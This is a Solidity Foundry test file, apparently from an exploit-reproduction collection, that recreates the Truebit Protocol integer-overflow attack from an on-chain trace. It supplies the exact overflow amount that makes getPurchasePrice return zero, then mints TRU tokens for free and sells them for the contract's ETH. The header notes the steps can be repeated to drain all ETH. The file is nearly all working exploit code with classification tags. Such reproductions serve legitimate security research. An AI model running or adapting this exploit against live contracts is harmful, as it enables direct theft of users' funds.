// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./TruebitBase.sol";

/*
@Title: Truebit Protocol Integer Overflow Exploit PoC
@Source: Phalcon trace of attack tx 0xcd4755...fb014
@Vulnerability: getPurchasePrice(uint256) returns 0 for specific overflow amounts
@Verified: Function selectors confirmed via `cast 4byte`:
  - buyTRU(uint256)  = 0xa0296215
  - sellTRU(uint256) = 0xc471b10b
@AttackFlow:
    1. getPurchasePrice(OVERFLOW_AMOUNT) → 0 (overflow in internal addition)
    2. buyTRU{value: 0}(OVERFLOW_AMOUNT) → free TRU mint
    3. sellTRU(TRU_BALANCE) → ETH withdrawn from Purchase contract
    4. Repeat to drain all ETH
*/

contract PoC_jungjipdo is TruebitBase {
    function setUp() public override {
        super.setUp(); // TruebitBase.setUp() 호출
        beneficiary = address(this);
    }

    function testExploit() public exploit {
        // ==================== Classification ====================
        addVulnerability(VulnerabilityType.INTEGER_OVERFLOW);
        addAttackVector(AttackVector.DIRECT_THEFT);
        addMitigation(Mitigation.INPUT_VALIDATION);

        // ==================== Pre-exploit state ====================
        uint256 purchaseEthBefore = PURCHASE_PROXY.balance;
        emit log_named_decimal_uint(
            "[PRE] Purchase ETH",
            purchaseEthBefore,
            18
        );
        emit log_named_decimal_uint(
            "[PRE] TRU totalSupply",
            tru.totalSupply(),
            18
        );

        // ==================== Exploit ====================
        // Amount extracted from Phalcon trace Line 3:
        // Purchase.getPurchasePrice(amountInWei=240,442,509,453,545,333,947,284,131) → 0
        // This specific value passes SafeMath.mul() but overflows in an unprotected addition
        uint256 overflowAmount = 240442509453545333947284131;
        // overflow 검증 -> 내부 덧셈 => 가격 0

        // Step 1: Verify price is 0 due to overflow
        uint256 price = purchase.getPurchasePrice(overflowAmount);
        emit log_named_uint("[STEP1] getPurchasePrice result", price);
        assertEq(price, 0, "Price should be 0 due to overflow");

        // Step 2: Mint TRU for free (msg.value must equal price = 0)
        purchase.buyTRU{value: 0}(overflowAmount);
        uint256 truMinted = tru.balanceOf(address(this));
        emit log_named_decimal_uint(
            "[STEP2] TRU minted for free",
            truMinted,
            18
        );

        // Step 3: Sell TRU for ETH
        tru.approve(PURCHASE_PROXY, truMinted);
        purchase.sellTRU(truMinted);

        uint256 ethProfit = address(this).balance;
        emit log_named_decimal_uint("[STEP3] ETH received", ethProfit, 18);

        // ==================== Record profit ====================
        addProfit(address(0), ethProfit);
    }

    receive() external payable {}
}
